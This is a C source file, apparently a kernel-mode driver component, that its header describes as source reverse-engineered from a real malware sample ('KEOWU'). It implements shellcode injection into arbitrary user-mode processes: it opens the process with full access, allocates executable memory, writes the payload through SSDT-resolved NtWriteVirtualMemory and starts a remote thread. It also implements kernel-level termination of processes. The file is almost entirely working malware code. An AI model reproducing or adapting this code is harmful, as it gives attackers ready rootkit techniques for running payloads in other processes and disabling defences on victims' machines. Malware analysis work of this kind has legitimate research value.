/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include "ProcessInjector.h"


NTSTATUS InjectShellcodeOnUsermodeProcess(
    
    SIZE_T szPid,
    PVOID pNtWriteSsdt,
    PVOID pZwCreateThreadExSsdt,
    unsigned char* chShellcode,
    ULONG ulShellcode

) {

    OBJECT_ATTRIBUTES objectAtributes = { 0 };
    CLIENT_ID clientId = { 0 };
    HANDLE hProcess = 0;
    HANDLE hThread = 0;

    objectAtributes.Length = 48;

    memset( &objectAtributes.RootDirectory, 0, 20 );
    
    objectAtributes.SecurityDescriptor = NULL;
    
    objectAtributes.SecurityQualityOfService = NULL;

    clientId.UniqueProcess = ( HANDLE )szPid;
    
    clientId.UniqueThread = ( HANDLE )0;

    PVOID baseAddress = NULL;

    NTSTATUS ntStatus = ZwOpenProcess(
        
        &hProcess,
        0x1FFFFF,
        &objectAtributes,
        &clientId
    
    );

    if ( NT_SUCCESS( ntStatus ) ) {

        SIZE_T szShellcode = ( ULONG )ulShellcode+1;

        ntStatus = ZwAllocateVirtualMemory(
            
            hProcess,
            &baseAddress,
            0, 
            &szShellcode,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        
        );

        if ( NT_SUCCESS( ntStatus ) ) {

            NtWriteVirtualMemory = ( _NtWriteVirtualMemory )pNtWriteSsdt;

            ZwCreateThreadEx = ( _ZwCreateThreadEx )pZwCreateThreadExSsdt;

            if ( NtWriteVirtualMemory == NULL || !MmIsAddressValid(
                
                pNtWriteSsdt
            
            ) ) {

                ZwClose(
                    
                    hProcess
                
                );

                return STATUS_UNSUCCESSFUL;
            }

            ntStatus = NtWriteVirtualMemory(
                
                hProcess,
                baseAddress,
                chShellcode,
                ulShellcode+1,
                NULL
            
            );

            ULONG_PTR ulBaseAddress = ( ULONG_PTR )baseAddress;

            ulBaseAddress += 0x2A;

            baseAddress = ( PVOID )ulBaseAddress;

            ntStatus = ZwCreateThreadEx(
                
                &hThread,
                0x1FFFFF,
                0,
                hProcess,
                ( PUSER_THREAD_START_ROUTINE )baseAddress,
                0,
                0i64,
                0i64,
                0i64,
                0i64,
                0i64
            
            );

            ZwWaitForSingleObject(
                
                hThread, 
                0, 
                0
            
            );

            ZwClose(
                
                &hThread
            
            );

            ZwClose(
                
                hProcess
            
            );

            DbgPrintEx(
                
                0,
                0,
                "Foi :)"
            
            );

            if ( NT_SUCCESS( ntStatus ) ) return STATUS_SUCCESS;
        }
        else DbgPrintEx(
            
            0,
            0,
            "Felicidade de pobre dura pouco viu..."
        
        );

    }

    return STATUS_INVALID_ADDRESS;
}


NTSTATUS TerminateUsemodeProcess(
    
    SIZE_T szPid

) {

    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

    HANDLE hProc = 0;

    CLIENT_ID clientID = { 0 };

    OBJECT_ATTRIBUTES objAttibutes = { 0 };

    objAttibutes.Length = 48;

    memset( &objAttibutes.RootDirectory, 0, 20 );

    objAttibutes.SecurityDescriptor = 0;

    objAttibutes.SecurityQualityOfService = 0;

    clientID.UniqueProcess = ( HANDLE )szPid;
    clientID.UniqueThread = ( HANDLE )0;

    ntStatus = ZwOpenProcess(
        
        &hProc,
        0x1FFFFF,
        &objAttibutes,
        &clientID
    
    );

    if ( NT_SUCCESS( ntStatus ) )
        return ZwTerminateProcess(
            
            hProc,
            0
        
        );

    return ntStatus;
}